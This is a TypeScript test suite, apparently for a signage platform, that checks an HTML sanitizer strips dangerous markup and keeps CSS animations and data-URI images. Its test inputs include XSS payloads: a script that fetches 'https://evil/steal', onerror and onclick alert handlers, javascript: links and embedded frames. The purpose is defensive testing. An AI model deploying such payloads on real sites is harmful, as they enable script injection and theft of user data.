import { describe, it, expect } from "vitest"
import { sanitizeSignageHtml, HTML_MAX_BYTES } from "./html-sanitize"

/** Henter ut den sanerte HTML-en, feiler testen tydelig hvis sanering ikke gikk. */
function clean(raw: string): string {
  const res = sanitizeSignageHtml(raw)
  if (!res.ok || !res.html) throw new Error(`Forventet ok, fikk: ${res.error}`)
  return res.html
}

describe("sanitizeSignageHtml — fjerner det farlige", () => {
  it("fjerner <script>-tagger og innholdet deres", () => {
    const out = clean(`<div>Hei</div><script>fetch('https://evil/steal')</script>`)
    expect(out).not.toMatch(/<script/i)
    expect(out).not.toContain("evil")
    expect(out).toContain("Hei")
  })

  it("fjerner event-handlere (onclick/onload/onerror)", () => {
    const out = clean(`<div onclick="alert(1)">x</div><img src="data:image/png;base64,AAAA" onerror="alert(2)">`)
    expect(out).not.toMatch(/onclick/i)
    expect(out).not.toMatch(/onerror/i)
    expect(out).not.toMatch(/onload/i)
  })

  it("fjerner eksterne bilde-referanser (kun data: overlever)", () => {
    const out = clean(`<img src="https://tracker.example/pixel.png"><img src="data:image/gif;base64,R0lGOD">`)
    expect(out).not.toContain("tracker.example")
    expect(out).toContain("data:image/gif;base64,R0lGOD")
  })

  it("fjerner javascript:-lenker", () => {
    const out = clean(`<a href="javascript:alert(1)">klikk</a>`)
    expect(out).not.toMatch(/javascript:/i)
  })

  it("fjerner iframe, object, embed, form", () => {
    const out = clean(`<iframe src="https://x"></iframe><object data="x"></object><embed src="x"><form action="https://x"><input></form>`)
    expect(out).not.toMatch(/<iframe/i)
    expect(out).not.toMatch(/<object/i)
    expect(out).not.toMatch(/<embed/i)
    expect(out).not.toMatch(/<form/i)
  })

  it("fjerner <link> til eksterne stilark og @import unngås via CSP", () => {
    const out = clean(`<link rel="stylesheet" href="https://fonts.example/x.css"><div>ok</div>`)
    expect(out).not.toMatch(/<link/i)
  })
})

describe("sanitizeSignageHtml — bevarer det som gir «levende» design", () => {
  it("beholder <style>-blokk med @keyframes og animation", () => {
    const raw = `<style>@keyframes float{from{transform:translateY(0)}to{transform:translateY(-20px)}}.b{animation:float 3s ease-in-out infinite}</style><div class="b">hopp</div>`
    const out = clean(raw)
    expect(out).toContain("@keyframes float")
    expect(out).toContain("animation:float 3s ease-in-out infinite")
  })

  it("beholder inline style med transform/animation uendret", () => {
    const out = clean(`<div style="transform:rotate(10deg);animation:spin 2s linear infinite;background:linear-gradient(135deg,#0f2740,#0a1524)">x</div>`)
    expect(out).toContain("transform:rotate(10deg)")
    expect(out).toContain("animation:spin 2s linear infinite")
    expect(out).toContain("linear-gradient(135deg,#0f2740,#0a1524)")
  })

  it("beholder data-URI-bilder", () => {
    const uri = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ"
    const out = clean(`<img src="${uri}" alt="logo">`)
    expect(out).toContain(uri)
  })

  it("beholder struktur, klasser og id", () => {
    const out = clean(`<section id="hero" class="stage"><h1>Ukens tilbud</h1><p>3 for 99,-</p></section>`)
    expect(out).toContain('id="hero"')
    expect(out).toContain('class="stage"')
    expect(out).toContain("Ukens tilbud")
    expect(out).toContain("3 for 99,-")
  })
})

describe("sanitizeSignageHtml — dokument-innpakning", () => {
  it("injiserer doctype, CSP-meta og full-bleed-reset", () => {
    const out = clean(`<div>x</div>`)
    expect(out.toLowerCase()).toContain("<!doctype html>")
    expect(out).toContain('http-equiv="Content-Security-Policy"')
    expect(out).toContain("default-src 'none'")
    expect(out).toContain("script-src 'none'")
    expect(out).toMatch(/overflow:\s*hidden/)
  })
})

describe("sanitizeSignageHtml — validering", () => {
  it("avviser tom fil", () => {
    expect(sanitizeSignageHtml("").ok).toBe(false)
    expect(sanitizeSignageHtml("   ").ok).toBe(false)
  })

  it("avviser fil over størrelsesgrensa", () => {
    const big = "<div>" + "a".repeat(HTML_MAX_BYTES + 10) + "</div>"
    const res = sanitizeSignageHtml(big)
    expect(res.ok).toBe(false)
    expect(res.error).toMatch(/maks 1,5 MB/)
  })

  it("godtar en fil på grensa", () => {
    const ok = sanitizeSignageHtml("<div>hei</div>")
    expect(ok.ok).toBe(true)
  })
})
